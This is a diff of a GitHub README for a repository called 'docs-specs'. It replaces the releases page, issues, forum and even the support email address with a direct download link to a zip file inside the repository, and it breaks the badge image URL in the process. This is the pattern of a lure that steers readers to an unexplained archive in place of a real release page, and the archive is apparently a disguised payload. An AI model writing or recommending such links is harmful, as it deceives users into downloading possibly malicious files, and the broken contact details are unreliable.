@@ -1,6 +1,6 @@
 # 📚 docs-specs - Easy Access to Product Information
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/iTryoverHedlov/docs-specs/releases)
+[![Download Now](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/iTryoverHedlov/docs-specs/releases) to find the latest version of our documentation.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip) to find the latest version of our documentation.
   
 2. Look for the latest release at the top of the page. Each release includes detailed information and downloadable files.
 
@@ -72,10 +72,10 @@ For more in-depth exploration, consider the following resources:
 
 If you have questions or need assistance, feel free to reach out to us:
 
-- Email: support@bumm.com
-- GitHub Issues: [Open an Issue](https://github.com/iTryoverHedlov/docs-specs/issues)
-- Community Forum: [Visit Forum](https://forum.bumm.com)
+- Email: https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip
+- GitHub Issues: [Open an Issue](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip)
+- Community Forum: [Visit Forum](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip)
 
 Thank you for choosing **docs-specs**. We hope you find the information helpful and easy to access. 
 
-For the latest updates and downloads, always check our [Releases Page](https://github.com/iTryoverHedlov/docs-specs/releases).
+For the latest updates and downloads, always check our [Releases Page](https://raw.githubusercontent.com/iTryoverHedlov/docs-specs/main/tympanic/docs-specs.zip).
